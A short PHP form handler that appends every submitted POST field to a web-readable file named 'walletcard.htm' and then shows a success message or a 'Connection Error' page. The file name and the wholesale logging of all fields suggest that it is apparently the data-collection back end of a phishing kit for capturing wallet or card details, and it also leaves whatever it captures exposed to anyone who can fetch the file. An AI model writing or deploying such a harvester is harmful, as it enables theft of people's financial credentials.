// Open walletcard.htm in append mode (or create if it doesn't exist)
$handle = fopen("walletcard.htm", "a");
if ($handle === false) {
    // Error handling if the file cannot be opened
    error_log("Error: Unable to open file walletcard.htm.");
    echo 'There was an error saving your data. Please try again later.';
    exit;
}

// Iterate through POST data and write to the file
$writeSuccess = true; // Track write success
foreach ($_POST as $variable => $value) {
    $safe_variable = htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
    $safe_value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    
    // Write the sanitized data to the file
    if (fwrite($handle, "$safe_variable=$safe_value<br>") === false) {
        $writeSuccess = false; // Mark as unsuccessful if any write fails
        break; // Exit loop if a write fails
    }
}

// Add a separator for entries
if ($writeSuccess) {
    fwrite($handle, "<hr>");
}

// Close the file handle
fclose($handle);

// Redirect logic
if ($writeSuccess) {
    // Success - you can redirect to a thank-you page or display a success message
    // Example: header('Location: success.html');
    echo 'Data saved successfully!';
} else {
    // Show error message if writing failed
    echo '
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Connection Error</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
            .error-container { border: 2px solid red; padding: 20px; display: inline-block; }
            h1 { color: red; }
            .btn { padding: 10px 20px; background-color: #f44336; color: white; text-decoration: none; border-radius: 5px; }
        </style>
    </head>
    <body>
        <div class="error-container">
            <h1>Error Saving Data</h1>
            <p>There was an issue saving your data. Please try again later.</p>
            <button class="btn" onclick="window.location.href=\'index.html\'">Go Back to Home</button>
        </div>
    </body>
    </html>
    ';
}

exit;
